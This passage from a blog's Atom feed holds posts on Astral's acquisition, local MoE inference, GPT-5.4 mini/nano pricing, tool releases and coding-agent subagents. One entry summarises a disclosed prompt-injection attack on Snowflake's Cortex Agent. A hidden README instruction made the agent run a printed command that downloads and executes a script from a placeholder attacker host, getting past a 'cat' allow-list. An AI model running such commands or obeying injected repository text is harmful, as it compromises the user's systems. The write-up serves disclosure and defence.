+&lt;p&gt;Armin Ronacher built &lt;a href="https://til.simonwillison.net/python/rye"&gt;Rye&lt;/a&gt;, which was later taken over by Astral and effectively merged with uv. In &lt;a href="https://lucumr.pocoo.org/2024/8/21/harvest-season/"&gt;August 2024&lt;/a&gt; he wrote about the risk involved in a VC-backed company owning a key piece of open source infrastructure and said the following (highlight mine):&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;However having seen the code and what uv is doing, &lt;strong&gt;even in the worst possible future this is a very forkable and maintainable thing&lt;/strong&gt;. I believe that even in case Astral shuts down or were to do something incredibly dodgy licensing wise, the community would be better off than before uv existed.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Astral's own Douglas Creager &lt;a href="https://news.ycombinator.com/item?id=47438723#47439974"&gt;emphasized this angle on Hacker News today&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;All I can say is that &lt;em&gt;right now&lt;/em&gt;, we're committed to maintaining our open-source tools with the same level of effort, care, and attention to detail as before. That does not change with this acquisition. No one can guarantee how motives, incentives, and decisions might change years down the line. But that's why we bake optionality into it with the tools being permissively licensed. That makes the worst-case scenarios have the shape of "fork and move on", and not "software disappears forever".&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I like and trust the Astral team and I'm optimistic that their projects will be well-maintained in their new home.&lt;/p&gt;
+&lt;p&gt;OpenAI don't yet have much of a track record with respect to acquiring and maintaining open source projects. They've been on a bit of an acquisition spree over the past three months though, snapping up &lt;a href="https://openai.com/index/openai-to-acquire-promptfoo/"&gt;Promptfoo&lt;/a&gt; and &lt;a href="https://steipete.me/posts/2026/openclaw"&gt;OpenClaw&lt;/a&gt; (sort-of, they hired creator Peter Steinberger and are spinning OpenClaw off to a foundation), plus closed source LaTeX platform &lt;a href="https://openai.com/index/introducing-prism/"&gt;Crixet (now Prism)&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;If things do go south for &lt;code&gt;uv&lt;/code&gt; and the other Astral projects we'll get to see how credible the forking exit strategy turns out to be.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/rust"&gt;rust&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ruff"&gt;ruff&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/uv"&gt;uv&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/astral"&gt;astral&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/charlie-marsh"&gt;charlie-marsh&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ty"&gt;ty&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="python"/><category term="ai"/><category term="rust"/><category term="openai"/><category term="ruff"/><category term="uv"/><category term="astral"/><category term="charlie-marsh"/><category term="coding-agents"/><category term="codex-cli"/><category term="ty"/></entry><entry><title>Autoresearching Apple's "LLM in a Flash" to run Qwen 397B locally</title><link href="https://simonwillison.net/2026/Mar/18/llm-in-a-flash/#atom-everything" rel="alternate"/><published>2026-03-18T23:56:46+00:00</published><updated>2026-03-18T23:56:46+00:00</updated><id>https://simonwillison.net/2026/Mar/18/llm-in-a-flash/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://twitter.com/danveloper/status/2034353876753592372"&gt;Autoresearching Apple&amp;#x27;s &amp;quot;LLM in a Flash&amp;quot; to run Qwen 397B locally&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+Here's a fascinating piece of research by Dan Woods, who managed to get a custom version of &lt;a href="https://huggingface.co/Qwen/Qwen3.5-397B-A17B/tree/main"&gt;Qwen3.5-397B-A17B&lt;/a&gt; running at 5.5+ tokens/second on a 48GB MacBook Pro M3 Max despite that model taking up 209GB (120GB quantized) on disk.&lt;/p&gt;
+&lt;p&gt;Qwen3.5-397B-A17B is a Mixture-of-Experts (MoE) model, which means that each token only needs to run against a subset of the overall model weights. These expert weights can be streamed into memory from SSD, saving them from all needing to be held in RAM at the same time.&lt;/p&gt;
+&lt;p&gt;Dan used techniques described in Apple's 2023 paper &lt;a href="https://arxiv.org/abs/2312.11514"&gt;LLM in a flash: Efficient Large Language Model Inference with Limited Memory&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This paper tackles the challenge of efficiently running LLMs that exceed the available DRAM capacity by storing the model parameters in flash memory, but bringing them on demand to DRAM. Our method involves constructing an inference cost model that takes into account the characteristics of flash memory, guiding us to optimize in two critical areas: reducing the volume of data transferred from flash and reading data in larger, more contiguous chunks.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;He fed the paper to Claude Code and used a variant of Andrej Karpathy's &lt;a href="https://simonwillison.net/2026/Mar/13/liquid/"&gt;autoresearch pattern&lt;/a&gt; to have Claude run 90 experiments and produce MLX Objective-C and Metal code that ran the model as efficiently as possible.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/danveloper/flash-moe"&gt;danveloper/flash-moe&lt;/a&gt; has the resulting code plus &lt;a href="https://github.com/danveloper/flash-moe/blob/main/paper/flash_moe.pdf"&gt;a PDF paper&lt;/a&gt; mostly written by Claude Opus 4.6 describing the experiment in full.&lt;/p&gt;
+&lt;p&gt;The final model has the experts quantized to 2-bit, but the non-expert parts of the model such as the embedding table and routing matrices are kept at their original precision, adding up to 5.5GB which stays resident in memory while the model is running.&lt;/p&gt;
+&lt;p&gt;Qwen 3.5 usually runs 10 experts per token, but this setup dropped that to 4 while claiming that the biggest quality drop-off occurred at 3.&lt;/p&gt;
+&lt;p&gt;It's not clear to me how much the quality of the model results are affected. Claude claimed that "Output quality at 2-bit is indistinguishable from 4-bit for these evaluations", but the description of the evaluations it ran is quite thin.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Dan's &lt;a href="https://twitter.com/danveloper/status/2034686509748462022"&gt;latest version&lt;/a&gt; upgrades to 4-bit quantization of the experts (209GB on disk, 4.36 tokens/second) after finding that the 2-bit version broke tool calling while 4-bit handles that well.
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/local-llms"&gt;local-llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/qwen"&gt;qwen&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/mlx"&gt;mlx&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai"/><category term="generative-ai"/><category term="local-llms"/><category term="llms"/><category term="qwen"/><category term="mlx"/></entry><entry><title>datasette 1.0a26</title><link href="https://simonwillison.net/2026/Mar/18/datasette/#atom-everything" rel="alternate"/><published>2026-03-18T22:16:19+00:00</published><updated>2026-03-18T22:16:19+00:00</updated><id>https://simonwillison.net/2026/Mar/18/datasette/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Release:&lt;/strong&gt; &lt;a href="https://github.com/simonw/datasette/releases/tag/1.0a26"&gt;datasette 1.0a26&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;Datasette now has a mechanism for assigning semantic column types. Built-in column types include &lt;code&gt;url&lt;/code&gt;, &lt;code&gt;email&lt;/code&gt;, and &lt;code&gt;json&lt;/code&gt;, and plugins can register additional types using the new &lt;a href="https://docs.datasette.io/en/latest/plugin_hooks.html#plugin-register-column-types"&gt;register_column_types()&lt;/a&gt; plugin hook.&lt;/p&gt;
+    
+
+</summary></entry><entry><title>Snowflake Cortex AI Escapes Sandbox and Executes Malware</title><link href="https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything" rel="alternate"/><published>2026-03-18T17:43:49+00:00</published><updated>2026-03-18T17:43:49+00:00</updated><id>https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware"&gt;Snowflake Cortex AI Escapes Sandbox and Executes Malware&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+PromptArmor report on a prompt injection attack chain in Snowflake's &lt;a href="https://docs.snowflake.com/en/user-guide/snowflake-cortex/cortex-agents"&gt;Cortex Agent&lt;/a&gt;, now fixed.&lt;/p&gt;
+&lt;p&gt;The attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.&lt;/p&gt;
+&lt;p&gt;The attack caused the agent to execute this code:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat &amp;lt; &amp;lt;(sh &amp;lt; &amp;lt;(wget -q0- https://ATTACKER_URL.com/bugbot))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cortex listed &lt;code&gt;cat&lt;/code&gt; commands as safe to run without human approval, without protecting against this form of process substitution that can occur in the body of the command.&lt;/p&gt;
+&lt;p&gt;I've seen allow-lists against command patterns like this in a bunch of different agent tools and I don't trust them at all - they feel inherently unreliable to me.&lt;/p&gt;
+&lt;p&gt;I'd rather treat agent commands as if they could do anything that process itself is allowed to do, hence my interest in deterministic sandboxes that operate outside of the layer of the agent itself.
+
+    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://news.ycombinator.com/item?id=47427017"&gt;Hacker News&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/sandboxing"&gt;sandboxing&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/security"&gt;security&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/prompt-injection"&gt;prompt-injection&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="sandboxing"/><category term="security"/><category term="ai"/><category term="prompt-injection"/><category term="generative-ai"/><category term="llms"/></entry><entry><title>Quoting Ken Jin</title><link href="https://simonwillison.net/2026/Mar/17/ken-jin/#atom-everything" rel="alternate"/><published>2026-03-17T21:48:26+00:00</published><updated>2026-03-17T21:48:26+00:00</updated><id>https://simonwillison.net/2026/Mar/17/ken-jin/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://fidget-spinner.github.io/posts/jit-on-track.html"&gt;&lt;p&gt;Great news—we’ve hit our (very modest) performance goals for the CPython JIT over a year early for macOS AArch64, and a few months early for x86_64 Linux. The 3.15 alpha JIT is about &lt;strong&gt;11-12%&lt;/strong&gt; faster on macOS AArch64 than the tail calling interpreter, and &lt;strong&gt;5-6%&lt;/strong&gt;faster than the standard interpreter on x86_64 Linux.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://fidget-spinner.github.io/posts/jit-on-track.html"&gt;Ken Jin&lt;/a&gt;, Python 3.15’s JIT is now back on track&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="python"/></entry><entry><title>GPT-5.4 mini and GPT-5.4 nano, which can describe 76,000 photos for $52</title><link href="https://simonwillison.net/2026/Mar/17/mini-and-nano/#atom-everything" rel="alternate"/><published>2026-03-17T19:39:17+00:00</published><updated>2026-03-17T19:39:17+00:00</updated><id>https://simonwillison.net/2026/Mar/17/mini-and-nano/#atom-everything</id><summary type="html">
+    &lt;p&gt;OpenAI today: &lt;a href="https://openai.com/index/introducing-gpt-5-4-mini-and-nano/"&gt;Introducing GPT‑5.4 mini and nano&lt;/a&gt;. These models join GPT-5.4 which was released &lt;a href="https://openai.com/index/introducing-gpt-5-4/"&gt;two weeks ago&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;OpenAI's self-reported benchmarks show the new 5.4-nano out-performing their previous GPT-5 mini model when run at maximum reasoning effort. The new mini is also 2x faster than the previous mini.&lt;/p&gt;
+&lt;p&gt;Here's how the pricing looks - all prices are per million tokens. &lt;code&gt;gpt-5.4-nano&lt;/code&gt; is notably even cheaper than Google's Gemini 3.1 Flash-Lite:&lt;/p&gt;
+&lt;center&gt;&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Model&lt;/th&gt;
+      &lt;th&gt;Input&lt;/th&gt;
+      &lt;th&gt;Cached input&lt;/th&gt;
+      &lt;th&gt;Output&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;gpt-5.4&lt;/td&gt;
+      &lt;td&gt;$2.50&lt;/td&gt;
+      &lt;td&gt;$0.25&lt;/td&gt;
+      &lt;td&gt;$15.00&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;gpt-5.4-mini&lt;/td&gt;
+      &lt;td&gt;$0.75&lt;/td&gt;
+      &lt;td&gt;$0.075&lt;/td&gt;
+      &lt;td&gt;$4.50&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;gpt-5.4-nano&lt;/td&gt;
+      &lt;td&gt;$0.20&lt;/td&gt;
+      &lt;td&gt;$0.02&lt;/td&gt;
+      &lt;td&gt;$1.25&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;&lt;td colspan="4"&gt;&lt;center&gt;Other models for comparison&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Claude Opus 4.6&lt;/td&gt;
+      &lt;td&gt;$5.00&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;$25.00&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Claude Sonnet 4.6&lt;/td&gt;
+      &lt;td&gt;$3.00&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;$15.00&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Gemini 3.1 Pro&lt;/td&gt;
+      &lt;td&gt;$2.00&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;$12.00&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Claude Haiku 4.5&lt;/td&gt;
+      &lt;td&gt;$1.00&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;$5.00&lt;/td&gt;
+    &lt;/tr&gt;
+&lt;tr&gt;
+      &lt;td&gt;Gemini 3.1 Flash-Lite&lt;/td&gt;
+      &lt;td&gt;$0.25&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;$1.50&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;&lt;/center&gt;
+&lt;p&gt;I used GPT-5.4 nano to generate a description of this photo I took at the &lt;a href="https://www.niche-museums.com/118"&gt;John M. Mossman Lock Collection&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2026/IMG_2324.jpeg" alt="Description below" style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;llm -m gpt-5.4-nano -a IMG_2324.jpeg 'describe image'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here's the output:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The image shows the interior of a museum gallery with a long display wall. White-painted brick walls are covered with many framed portraits arranged in neat rows. Below the portraits, there are multiple glass display cases with dark wooden frames and glass tops/fronts, containing various old historical objects and equipment. The room has a polished wooden floor, hanging ceiling light fixtures/cords, and a few visible pipes near the top of the wall. In the foreground, glass cases run along the length of the room, reflecting items from other sections of the gallery.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;That took 2,751 input tokens and 112 output tokens, at a cost of &lt;a href="https://www.llm-prices.com/#it=2751&amp;amp;ot=112&amp;amp;sel=gpt-5.4-nano"&gt;0.069 cents&lt;/a&gt; (less than a tenth of a cent). That means describing every single photo in my 76,000 photo collection would cost around $52.44.&lt;/p&gt;
+&lt;p&gt;I released &lt;a href="https://llm.datasette.io/en/stable/changelog.html#v0-29"&gt;llm 0.29&lt;/a&gt; with support for the new models.&lt;/p&gt;
+&lt;p&gt;Then I had OpenAI Codex loop through all five reasoning effort levels and all three models and produce this combined SVG grid of pelicans riding bicycles (&lt;a href="https://gist.github.com/simonw/f16292d9a5b90b28054cff3ba497a3ca"&gt;generation transcripts here&lt;/a&gt;). I do like the gpt-5.4 xhigh one the best, it has a good bicycle (with nice spokes) and the pelican has a fish in its beak!&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2026/gpt-5.4-pelican-family.svg" alt="Described by Claude Opus 4.6: A 5x3 comparison grid of AI-generated cartoon illustrations of a pelican riding a bicycle. Columns are labeled &amp;quot;gpt-5.4-nano&amp;quot;, &amp;quot;gpt-5.4-mini&amp;quot;, and &amp;quot;gpt-5.4&amp;quot; across the top, and rows are labeled &amp;quot;none&amp;quot;, &amp;quot;low&amp;quot;, &amp;quot;medium&amp;quot;, &amp;quot;high&amp;quot;, and &amp;quot;xhigh&amp;quot; down the left side, representing quality/detail settings. In the &amp;quot;none&amp;quot; row, gpt-5.4-nano shows a chaotic white bird with misplaced arrows and tangled wheels on grass, gpt-5.4-mini shows a duck-like brown bird awkwardly straddling a motorcycle-like bike, and gpt-5.4 shows a stiff gray-and-white pelican sitting atop a blue tandem bicycle with extra legs. In the &amp;quot;low&amp;quot; row, nano shows a chubby round white bird pedaling with small feet on grass, mini shows a cleaner white bird riding a blue bicycle with motion lines, and gpt-5.4 shows a pelican with a blue cap riding confidently but with slightly awkward proportions. In the &amp;quot;medium&amp;quot; row, nano regresses to a strange bird standing over bowling balls on ice, mini shows two plump white birds merged onto one yellow-wheeled bicycle, and gpt-5.4 shows a more recognizable gray-and-white pelican on a red bicycle but with tangled extra legs. In the &amp;quot;high&amp;quot; row, nano shows multiple small pelicans crowded around a broken green bicycle on grass with a sun overhead, mini shows a tandem bicycle with two white pelicans and clear blue sky, and gpt-5.4 shows two pelicans stacked on a red tandem bike with the most realistic proportions yet. In the &amp;quot;xhigh&amp;quot; row, nano shows the most detailed scene with a pelican on a detailed bicycle with grass and a large sun but still somewhat jumbled anatomy, mini produces the cleanest single pelican on a yellow-accented bicycle with a light blue sky, and gpt-5.4 shows a well-rendered gray pelican on a teal bicycle with the best overall coherence. Generally, quality improves moving right across models and down through quality tiers, though &amp;quot;medium&amp;quot; is inconsistently worse than &amp;quot;low&amp;quot; for some models, and all images maintain a lighthearted cartoon style with pastel skies and simple backgrounds." style="max-width: 100%;" /&gt;&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm"&gt;llm&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vision-llms"&gt;vision-llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-pricing"&gt;llm-pricing&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pelican-riding-a-bicycle"&gt;pelican-riding-a-bicycle&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llm-release"&gt;llm-release&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="ai"/><category term="openai"/><category term="generative-ai"/><category term="llms"/><category term="llm"/><category term="vision-llms"/><category term="llm-pricing"/><category term="pelican-riding-a-bicycle"/><category term="llm-release"/></entry><entry><title>llm 0.29</title><link href="https://simonwillison.net/2026/Mar/17/llm/#atom-everything" rel="alternate"/><published>2026-03-17T19:24:10+00:00</published><updated>2026-03-17T19:24:10+00:00</updated><id>https://simonwillison.net/2026/Mar/17/llm/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;strong&gt;Release:&lt;/strong&gt; &lt;a href="https://github.com/simonw/llm/releases/tag/0.29"&gt;llm 0.29&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;Adds support for OpenAI's new models &lt;code&gt;gpt-5.4&lt;/code&gt;, &lt;code&gt;gpt-5.4-mini&lt;/code&gt;, and &lt;code&gt;gpt-5.4-nano&lt;/code&gt;.&lt;/p&gt;
+    
+
+</summary></entry><entry><title>Quoting Tim Schilling</title><link href="https://simonwillison.net/2026/Mar/17/tim-schilling/#atom-everything" rel="alternate"/><published>2026-03-17T16:13:37+00:00</published><updated>2026-03-17T16:13:37+00:00</updated><id>https://simonwillison.net/2026/Mar/17/tim-schilling/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://www.better-simple.com/django/2026/03/16/give-django-your-time-and-money/"&gt;&lt;p&gt;If you do not understand the ticket, if you do not understand the solution, or if you do not understand the feedback on your PR, then your use of LLM is hurting Django as a whole. [...]&lt;/p&gt;
+&lt;p&gt;For a reviewer, it’s demoralizing to communicate with a facade of a human.&lt;/p&gt;
+&lt;p&gt;This is because contributing to open source, especially Django, is a communal endeavor. Removing your humanity from that experience makes that endeavor more difficult. If you use an LLM to contribute to Django, it needs to be as a complementary tool, not as your vehicle.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://www.better-simple.com/django/2026/03/16/give-django-your-time-and-money/"&gt;Tim Schilling&lt;/a&gt;, Give Django your time and money, not your tokens&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/open-source"&gt;open-source&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/django"&gt;django&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="ai-ethics"/><category term="open-source"/><category term="generative-ai"/><category term="ai"/><category term="django"/><category term="llms"/></entry><entry><title>Subagents</title><link href="https://simonwillison.net/guides/agentic-engineering-patterns/subagents/#atom-everything" rel="alternate"/><published>2026-03-17T12:32:28+00:00</published><updated>2026-03-17T12:32:28+00:00</updated><id>https://simonwillison.net/guides/agentic-engineering-patterns/subagents/#atom-everything</id><summary type="html">
+    &lt;p&gt;&lt;em&gt;&lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/"&gt;Agentic Engineering Patterns&lt;/a&gt; &amp;gt;&lt;/em&gt;&lt;/p&gt;
+    &lt;p&gt;LLMs are restricted by their &lt;strong&gt;context limit&lt;/strong&gt; - how many tokens they can fit in their working memory at any given time. These values have not increased much over the past two years even as the LLMs themselves have seen dramatic improvements in their abilities - they generally top out at around 1,000,000, and benchmarks frequently report better quality results below 200,000.&lt;/p&gt;
+&lt;p&gt;Carefully managing the context such that it fits within those limits is critical to getting great results out of a model.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Subagents&lt;/strong&gt; provide a simple but effective way to handle larger tasks without burning through too much of the coding agent’s valuable top-level context.&lt;/p&gt;
+&lt;p&gt;When a coding agent uses a subagent it effectively dispatches a fresh copy of itself to achieve a specified goal, with a new context window that starts with a fresh prompt.&lt;/p&gt;
+&lt;h2 id="claude-codes-explore-subagent"&gt;Claude Code’s Explore subagent&lt;/h2&gt;
+&lt;p&gt;Claude Code uses subagents extensively as part of its standard way of working. Let's use that as an illustrative example.&lt;/p&gt;
+&lt;p&gt;Any time you start a new task against an existing repo Claude Code first needs to explore that repo to figure out its general shape and find relevant information needed to achieve that task.&lt;/p&gt;
+&lt;p&gt;It does this by constructing a prompt and dispatching a subagent to perform that exploration and return a description of what it finds.&lt;/p&gt;
+&lt;p&gt;I kicked off a Claude Code session with a screenshot of &lt;a href="https://simonwillison.net/guides/agentic-engineering-patterns/linear-walkthroughs/changes/"&gt;a page from my guide&lt;/a&gt; and this prompt:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Make the chapter diffs also show which characters have changed in this diff view with a darker color of red or green for the individually changed segments of text within the line&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Here's &lt;a href="https://gisthost.github.io/?effbdc564939b88fe5c6299387e217da/index.html"&gt;the transcript&lt;/a&gt; of that session.&lt;/p&gt;
+&lt;p&gt;Claude Code started by running an “Explore” subagent with the following starter prompt:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Find the code that implements the diff view for "chapters" in this Django blog. I need to find:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Templates that render diffs (look for diff-related HTML/CSS with red/green backgrounds)&lt;/li&gt;
+&lt;li&gt;Python code that generates diffs (look for difflib usage or similar)&lt;/li&gt;
+&lt;li&gt;Any JavaScript related to diff rendering&lt;/li&gt;
+&lt;li&gt;CSS styles for the diff view (red/green line backgrounds)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Search thoroughly - check templates/, static/, blog/ directories. Look for keywords like "diff", "chapter", "revision", "history", "compare".&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Subagents work similar to any other tool call: the parent agent dispatches them just as they would any other tool and waits for the response. It's interesting to see models prompt themselves in this way - they generally have good taste in prompting strategies.&lt;/p&gt;
+&lt;p&gt;The Explore subagent churned away for a few seconds and returned a response that started like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Perfect! Now let me create a comprehensive summary with all the findings:&lt;/p&gt;
+&lt;h3 id="summary-chapter-diff-view-implementation"&gt;Summary: Chapter Diff View Implementation&lt;/h3&gt;
+&lt;p&gt;I found the complete implementation of the diff view for chapters in this Django blog. Here are the key components:&lt;/p&gt;
+&lt;h4 id="1-python-code-diff-generation-homeusersimonwillisonblogguidesviewspy-lines-139-202"&gt;1. &lt;strong&gt;Python Code - Diff Generation&lt;/strong&gt; (&lt;code&gt;/home/user/simonwillisonblog/guides/views.py&lt;/code&gt;, lines 139-202)&lt;/h4&gt;
+&lt;p&gt;The &lt;code&gt;chapter_changes()&lt;/code&gt; view function uses Python's built-in &lt;code&gt;difflib.unified_diff()&lt;/code&gt; to generate diffs: […]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The full subagent response included all of the details the parent agent needed in order to start editing the code to address my original request.&lt;/p&gt;
+&lt;h2 id="parallel-subagents"&gt;Parallel subagents&lt;/h2&gt;
+&lt;p&gt;This Explore subagent is the simplest example of how subagents can work, with the parent agent pausing while the subagent runs. The principle advantage of this kind of subagent is that it can work with a fresh context in a way that avoids spending tokens from the parent’s available limit.&lt;/p&gt;
+&lt;p&gt;Subagents can also provide a significant performance boost by having the parent agent run multiple subagents at the same time, potentially also using faster and cheaper models such as Claude Haiku to accelerate those tasks.&lt;/p&gt;
+&lt;p&gt;Coding agents that support subagents can use them based on your instructions. Try prompts like this:&lt;/p&gt;
+&lt;p&gt;&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Use subagents to find and update all of the templates that are affected by this change.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+For tasks that involve editing several files - and where those files are not dependent on each other - this can offer a significant speed boost.&lt;/p&gt;
+&lt;h2 id="specialist-subagents"&gt;Specialist subagents&lt;/h2&gt;
+&lt;p&gt;Some coding agents allow subagents to run with further customizations, often in the form of a custom system prompt or custom tools or both, which allow those subagents to take on a different role.&lt;/p&gt;
+&lt;p&gt;These roles can cover a variety of useful specialties:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A &lt;strong&gt;code reviewer&lt;/strong&gt; agent can review code and identify bugs, feature gaps or weaknesses in the design.&lt;/li&gt;
+&lt;li&gt;A &lt;strong&gt;test runner&lt;/strong&gt; agent can run the test. This is particularly worthwhile if your test suite is large and verbose, as the subagent can hide the full test output from the main coding agent and report back with just details of any failures.&lt;/li&gt;
+&lt;li&gt;A &lt;strong&gt;debugger&lt;/strong&gt; agent can specialize in debugging problems, spending its token allowance reasoning though the codebase and running snippets of code to help isolate steps to reproduce and determine the root cause of a bug.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;While it can be tempting to go overboard breaking up tasks across dozens of different specialist subagents, it's important to remember that the main value of subagents is in preserving that valuable root context and managing token-heavy operations. Your root coding agent is perfectly capable of debugging or reviewing its own output provided it has the tokens to spare.&lt;/p&gt;
+&lt;h2 id="official-documentation"&gt;Official documentation&lt;/h2&gt;
+&lt;p&gt;Several popular coding agents support subagents, each with their own documentation on how to use them:&lt;/p&gt;
+&lt;ul&gt;
